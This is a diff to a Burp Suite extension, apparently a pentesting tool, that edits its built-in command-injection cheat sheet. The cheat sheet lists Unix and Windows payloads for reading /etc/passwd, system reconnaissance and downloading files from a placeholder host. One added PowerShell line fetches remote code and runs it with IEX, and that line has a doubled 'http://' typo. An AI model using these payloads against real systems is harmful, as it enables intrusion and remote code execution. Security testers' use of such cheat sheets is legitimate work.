@@ -846,11 +846,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         
         self._txtCheatSheetCommandInj = ""
         self._txtCheatSheetCommandInj += "Command Inj Unix\t\t\t\t\tCommand Inj Windows\n"
-        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\t\tcmd.exe?/c type file.txt\n"
+        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\t\ttype file.txt\n"
         self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\t\tsysteminfo\n"
-        self._txtCheatSheetCommandInj += "\t/usr/bin/id\t\t\t\t\t\twhoami /priv\n"
+        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\t\twhoami /priv\n"
         self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\t\tping -n 10 X.X.X.X\n"
-        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"       
+        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
+        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         _lblDepth.setToolTipText("Generate payloads only for some certain folder depth.")
         _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
